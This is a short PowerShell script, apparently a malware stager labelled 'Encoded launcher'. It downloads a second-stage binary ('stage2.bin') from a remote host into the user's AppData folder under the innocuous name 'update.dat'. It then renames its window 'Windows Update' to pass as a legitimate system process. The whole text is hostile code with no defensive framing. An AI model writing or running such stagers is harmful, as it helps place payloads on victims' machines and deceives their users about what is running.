
# Encoded launcher
$TargetUrl = "https://internal.corp:8443/stage2.bin"
$LocalPath = "$env:APPDATA\update.dat"
(New-Object System.Net.WebClient).DownloadFile($TargetUrl, $LocalPath)
$Host.UI.RawUI.WindowTitle = "Windows Update"
